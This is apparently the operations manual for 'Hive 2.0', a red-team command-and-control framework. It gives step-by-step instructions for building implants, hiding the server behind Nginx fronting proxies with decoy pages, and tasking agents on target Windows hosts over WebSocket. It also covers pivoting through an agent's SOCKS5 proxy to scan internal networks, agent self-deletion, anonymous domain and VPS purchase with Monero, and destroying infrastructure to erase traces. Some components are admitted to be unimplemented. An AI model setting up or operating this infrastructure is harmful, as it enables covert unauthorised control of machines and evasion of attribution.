# Hive 2.0 — Operations Manual

**Version:** 1.0  
**Audience:** Red Team Operators, System Administrators  
**Last Updated:** 2026-05-13

---

## Table of Contents

1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Environment Preparation](#environment-preparation)
   - 3.1 [Installing Go](#installing-go)
   - 3.2 [Cloning the Repository](#cloning-the-repository)
   - 3.3 [Building from Source](#building-from-source)
4. [Configuration Management](#configuration-management)
   - 4.1 [Generating Encryption Keys](#generating-encryption-keys)
   - 4.2 [Creating Plaintext Configs](#creating-plaintext-configs)
   - 4.3 [Encrypting Configs](#encrypting-configs)
5. [Fronting Proxy Deployment](#fronting-proxy-deployment)
   - 5.1 [Provisioning a VPS](#provisioning-a-vps)
   - 5.2 [Automated Setup with Ansible](#automated-setup-with-ansible)
   - 5.3 [Manual Nginx Configuration](#manual-nginx-configuration)
   - 5.4 [Verifying the Proxy](#verifying-the-proxy)
   - 5.5 [Rotating Certificates](#rotating-certificates)
   - 5.6 [Destroying a Proxy](#destroying-a-proxy)
6. [Running the Hive Server](#running-the-hive-server)
   - 6.1 [Starting the Server](#starting-the-server)
   - 6.2 [Configuring TLS Certificates](#configuring-tls-certificates)
   - 6.3 [Accessing the Dashboard](#accessing-the-dashboard)
   - 6.4 [Server Logging](#server-logging)
7. [Running an Agent](#running-an-agent)
   - 7.1 [Direct Connection (Testing)](#direct-connection-testing)
   - 7.2 [Production Connection via Proxy](#production-connection-via-proxy)
   - 7.3 [Agent Reconnection Behaviour](#agent-reconnection-behaviour)
   - 7.4 [Cross‑Compilation for Windows](#cross-compilation-for-windows)
8. [Operational Tasks](#operational-tasks)
   - 8.1 [Listing Agents](#listing-agents)
   - 8.2 [Sending Commands](#sending-commands)
   - 8.3 [Viewing Results](#viewing-results)
   - 8.4 [Enabling the SOCKS5 Proxy](#enabling-the-socks5-proxy)
   - 8.5 [Agent Self‑Destruct](#agent-self-destruct)
   - 8.6 [Generating an Operation Report](#generating-an-operation-report)
9. [Security Procedures](#security-procedures)
   - 9.1 [Key Hygiene](#key-hygiene)
   - 9.2 [Proxy Anonymisation](#proxy-anonymisation)
   - 9.3 [Incident Response](#incident-response)
10. [Troubleshooting](#troubleshooting)
    - 10.1 [Agent Cannot Connect](#agent-cannot-connect)
    - 10.2 [WebSocket Upgrade Failure](#websocket-upgrade-failure)
    - 10.3 [Command Execution Timeout](#command-execution-timeout)
    - 10.4 [SOCKS5 Proxy Not Working](#socks5-proxy-not-working)
11. [Appendix: Example Session](#appendix-example-session)
12. [Glossary](#glossary)

---

## 1. Introduction

This manual describes the complete lifecycle of a Hive 2.0 operation: from building the binaries, through deploying fronting proxies, to commanding agents and retrieving results. Every step is designed to be repeatable and auditable. Follow the procedures in order the first time you set up a new swarm.

---

## 2. Prerequisites

- **Go 1.22** or later (for building from source).
- **GNU Make** (optional, simplifies build).
- **Ansible 2.14+** (for automated proxy deployment).
- **SSH access** to the target VPS instances.
- **OpenSSL** (for certificate and key generation).
- A **domain name** (or subdomain) for each fronting proxy.
- Basic familiarity with the Linux command line.

---

## 3. Environment Preparation

### 3.1 Installing Go

Download and install Go 1.22 from [go.dev/dl](https://go.dev/dl). After installation, verify:

```bash
go version
# Expected: go version go1.22.x linux/amd64

3.2 Cloning the Repository
bash

git clone https://github.com/blackswarm/hive.git
cd hive

3.3 Building from Source

Build both agent and server binaries:
bash

make build

The output binaries will be placed in the bin/ directory:

    bin/hive-server — the command centre.

    bin/hive-agent — the agent.

For Windows agents:
bash

make build-agent-win
# Produces bin/hive-agent.exe

4. Configuration Management

All configuration files are JSON documents encrypted with AES‑256‑GCM. A 32‑byte key is required to encrypt or decrypt them.
4.1 Generating Encryption Keys

Generate a secure random key:
bash

openssl rand -base64 32

Output example: 3Zg8...= (44 characters, 32 bytes when decoded).

Set this key in your shell environment:
bash

export HIVE_CONFIG_KEY="your-base64-encoded-32-byte-key"

Keep this key secret. Without it, configurations cannot be read.
4.2 Creating Plaintext Configs

Create two plain JSON files based on the provided templates.

Agent configuration (agent.json):
json

{
  "mode": "agent",
  "server_port": 8443,
  "proxies": [
    "proxy1.yourdomain.com",
    "proxy2.yourdomain.com"
  ],
  "agent_id": "bee-01",
  "secret_key": "placeholder-will-be-replaced"
}

    proxies: ordered list of fronting proxy domains. The agent will try them in sequence.

    agent_id: unique identifier for this agent (e.g., bee-01, bee-02).

    secret_key: temporary placeholder; the encryption step will replace it with a generated key.

Server configuration (server.json):
json

{
  "mode": "server",
  "server_port": 8443,
  "proxies": [],
  "agent_id": "",
  "secret_key": "placeholder-will-be-replaced"
}

The server configuration does not require a proxy list; it receives connections via the proxies.
4.3 Encrypting Configs

Use the supplied helper program or call config.SaveConfig directly. For simplicity, you can run a small Go tool (to be built from cmd/configtool), but the repository includes a simple script. Alternatively, you can write a temporary Go program:
bash

# Inside the project directory, you may use the existing config.SaveConfig logic
# A dedicated tool is not yet provided, but you can write a simple main.go:
cat > /tmp/encrypt.go << 'EOF'
package main

import (
    "os"
    "github.com/blackswarm/hive/internal/config"
    "github.com/blackswarm/hive/internal/crypto"
)

func main() {
    key := []byte(os.Getenv("HIVE_CONFIG_KEY"))
    // Decode base64 if needed
    // Load plain config from arg[1]
    // Save encrypted to arg[2]
}
EOF

Manual encryption (until a tool exists): Use the openssl command line:
bash

# Encrypt agent.json to agent_config.json
openssl enc -aes-256-gcm -in agent.json -out agent_config.json \
    -K $(echo -n "$HIVE_CONFIG_KEY" | base64 -d | xxd -p -c 32) \
    -iv $(openssl rand -hex 12)   # GCM nonce (12 bytes)

Note: The Go implementation expects the nonce prepended to the ciphertext, so manual encryption must match this format. It is recommended to use the in‑code tooling for compatibility.

For production, a configtool binary will be provided. Until then, place the plain configs in a secure location and use the temporary Go program above, or encrypt programmatically.
5. Fronting Proxy Deployment

Each fronting proxy is an Nginx server that serves a static cover website and proxies WebSocket connections to the backend hive.
5.1 Provisioning a VPS

    Choose a cheap VPS provider (e.g., Hetzner, Contabo, Vultr).

    Install a minimal Debian 12.

    Ensure you have SSH root access and the public IP.

    Register a domain name (or subdomain) pointing to this IP.

5.2 Automated Setup with Ansible

The repository includes scripts/deploy_proxy.yml.

    Install Ansible on your local machine.

    Create an inventory file (e.g., hosts.ini):
    text

[proxy]
proxy1.example.com ansible_user=root

Run the playbook:
bash

ansible-playbook -i hosts.ini scripts/deploy_proxy.yml

    The playbook will:

        Install Nginx.

        Generate a self‑signed certificate.

        Create a minimal cover website.

        Configure the Nginx proxy.

        Restart Nginx.

5.3 Manual Nginx Configuration

If you prefer manual setup:

    Install Nginx: apt update && apt install -y nginx openssl

    Create /etc/nginx/certs and generate a certificate:
    bash

openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/nginx/certs/proxy.key \
    -out /etc/nginx/certs/proxy.crt \
    -subj "/CN=proxy1.example.com"

Place the cover website in /var/www/hive-cover/index.html:
html

<!DOCTYPE html><html><head><title>Under Maintenance</title></head>
<body><h1>We'll be back soon.</h1></body></html>

Copy the Nginx configuration from configs/proxy_nginx.conf into /etc/nginx/sites-available/hive-proxy.

Enable the site:
bash

ln -s /etc/nginx/sites-available/hive-proxy /etc/nginx/sites-enabled/
rm /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx

5.4 Verifying the Proxy

    Open a browser and navigate to https://proxy1.example.com. You should see the maintenance page.

    Check the WebSocket endpoint using curl:
    bash

curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
     -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
     https://proxy1.example.com/ws

    You should receive an HTTP 101 Switching Protocols response.

5.5 Rotating Certificates

To replace the self‑signed certificate without downtime, use the rotate_certs.sh script:
bash

./scripts/rotate_certs.sh proxy1.example.com

The script backs up the old certificate, generates a new one, and restarts Nginx.
5.6 Destroying a Proxy

To completely remove a proxy and its traces:
bash

./scripts/destroy_proxy.sh

This will purge Nginx, delete configuration files, and remove the cover website.
6. Running the Hive Server
6.1 Starting the Server

Place the encrypted server config (e.g., server_config.json) in a known location.
bash

export HIVE_CONFIG_KEY="your-base64-encoded-key"
./bin/hive-server -mode=server -config=./server_config.json

If the TLS certificate and key (server.crt, server.key) are present in the working directory, the server will use TLS 1.3. Otherwise, it falls back to plain HTTP (not recommended).
6.2 Configuring TLS Certificates

For production, obtain a certificate (Let’s Encrypt or self‑signed) and rename the files to server.crt and server.key. The server auto‑detects them at startup.

Generate a self‑signed certificate:
bash

openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout server.key -out server.crt \
    -subj "/CN=hive.internal"

6.3 Accessing the Dashboard

Open a browser and go to https://<hive-address>:8443. The embedded React dashboard loads automatically. It displays a list of online agents and allows you to send commands.

Note: The dashboard currently calls /api/agents and /api/tasks endpoints that are not yet implemented in the server code provided. The operator must use the WebSocket protocol directly for tasking; a future update will wire the dashboard to the agent manager.
6.4 Server Logging

The server logs JSON‑structured logs to stdout. You can redirect them to a file:
bash

./bin/hive-server ... 2>&1 | tee server.log

7. Running an Agent
7.1 Direct Connection (Testing)

For testing without a proxy, set the server URL directly:
bash

./bin/hive-agent -mode=agent -config=./agent_config.json

But the agent expects the proxy list; you can temporarily set the first proxy to the server address and ensure the server is listening on the same port.
7.2 Production Connection via Proxy

Ensure the agent configuration includes at least one proxy domain:
json

"proxies": ["proxy1.example.com"]

Start the agent:
bash

export HIVE_CONFIG_KEY="..."
./bin/hive-agent -mode=agent -config=./agent_config.json

The agent will connect to wss://proxy1.example.com/ws, which is forwarded by Nginx to the hive.
7.3 Agent Reconnection Behaviour

    If the connection drops, the agent waits 2 seconds before retrying, then 4, 8, … up to 60 seconds.

    It continues indefinitely until it connects or is terminated.

7.4 Cross‑Compilation for Windows

On a Linux system:
bash

make build-agent-win

Transfer bin/hive-agent.exe to the target Windows machine. You can run it as:
cmd

set HIVE_CONFIG_KEY=...
hive-agent.exe -mode=agent -config=agent_config.json

The Windows agent has the same functionality, including self‑destruct (delayed deletion on reboot).
8. Operational Tasks
8.1 Listing Agents

Via the dashboard (when fully integrated) or programmatically using the server’s API (not yet implemented). Currently, the operator must monitor server logs to see which agents are connected.
8.2 Sending Commands

Send a JSON message over the WebSocket of the desired agent. This requires a client that can inject messages into the agent’s connection. The server handler supports a SendTask function, which can be called from an operator CLI or integrated dashboard.

Temporary manual method: use websocat or a custom script to connect to the hive’s WebSocket and send a TaskMsg:
json

{
  "type": "task",
  "payload": {
    "task_id": "001",
    "command": "whoami",
    "timeout": 30
  }
}

The agent will reply with a ResultMsg.
8.3 Viewing Results

Results are logged by the server and also available via the ResultMsg payload. The operator can collect them from the server logs or the dashboard.
8.4 Enabling the SOCKS5 Proxy

Send a proxy_on message to the agent. The agent will start a SOCKS5 proxy on port 1080 (default). You can then configure your tools (e.g., browser, proxychains) to use socks5://<agent-ip>:1080.

To stop the proxy, send proxy_off.
8.5 Agent Self‑Destruct

Send a destroy message. The agent will:

    On Linux: delete its own binary and call os.Exit(0).

    On Windows: use MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT to schedule deletion on next reboot, then exit.

This action is irreversible.
8.6 Generating an Operation Report

The reporting.go module can produce a Markdown report. Call the GenerateReport function with the agent manager, a list of dispatched tasks, and a list of results. This is typically done by the server after the operation concludes. The output can be piped to a .md file and converted to PDF.
9. Security Procedures
9.1 Key Hygiene

    Never store the HIVE_CONFIG_KEY in version control.

    Use different keys for different environments (testing vs. production).

    Rotate keys between operations if a compromise is suspected.

9.2 Proxy Anonymisation

    Register domains with anonymous details (e.g., Njalla).

    Pay for VPS with cryptocurrency (Monero preferred).

    Do not reuse proxy IPs across operations; destroy them after the engagement.

9.3 Incident Response

If a proxy is taken down or the hive is compromised:

    Send a destroy message to all agents (if possible).

    Shred configuration files on the hive.

    Run destroy_proxy.sh on each proxy.

    Rotate all keys and domain registrations.

10. Troubleshooting
10.1 Agent Cannot Connect

    Check that the proxy domain resolves to the correct IP.

    Verify that Nginx is running and the /ws location is correctly configured.

    Look at agent logs for TLS or WebSocket handshake errors.

    Ensure the agent’s proxies list contains the correct domain.

10.2 WebSocket Upgrade Failure

    Confirm that proxy_http_version 1.1 and the Upgrade and Connection headers are set in the Nginx config.

    Check the backend hive server is reachable from the proxy.

10.3 Command Execution Timeout

    Increase the timeout field in TaskMsg or set a higher default in the agent’s config.

    Ensure the command does not require interactive input; all commands run non‑interactively.

10.4 SOCKS5 Proxy Not Working

    Verify the agent received proxy_on and the logs show “SOCKS5 proxy started”.

    Check network connectivity between your pivot machine and the agent’s IP.

    Ensure no firewall blocks port 1080.

11. Appendix: Example Session

Setup:

    Proxy: proxy1.ops.net

    Hive: internal IP 10.0.0.5

    Agent: bee-01 on a target Windows host

1. Start the hive server:
bash

./bin/hive-server -mode=server -config=server_config.json

2. Start the agent on target (via proxy):
cmd

set HIVE_CONFIG_KEY=...
hive-agent.exe -mode=agent -config=agent_config.json

3. Agent registers; hive log shows:
text

INFO agent registered id=bee-01 hostname=WIN-TARGET

4. Send a task (using websocat from operator machine):
bash

echo '{"type":"task","payload":{"task_id":"1","command":"ipconfig","timeout":10}}' | \
  websocat wss://proxy1.ops.net/ws

5. Result appears in hive log:
text

INFO task result received task_id=1 agent=bee-01 stdout=Windows IP Configuration...

6. Enable SOCKS5 proxy on agent:
Send {"type":"proxy_on"}. The agent starts a SOCKS5 proxy on port 1080.

7. Pivot through agent:
bash

proxychains nmap -sT -Pn 10.0.0.0/24

8. Generate report:
Call GenerateReport and save to report.md.

9. Clean up:
Send {"type":"destroy"} to the agent. Then destroy the proxy VPS.
12. Glossary
Term	Meaning
Hive	Command centre server managing one or more agents.
Agent (Bee)	Implant running on the target.
Fronting Proxy	Nginx server that hides the hive behind a benign website.
WebSocket	Full‑duplex protocol used for C2 communication.
SOCKS5	Proxy protocol allowing TCP/UDP tunnelling.
AES‑256‑GCM	Encryption algorithm used for configuration files.
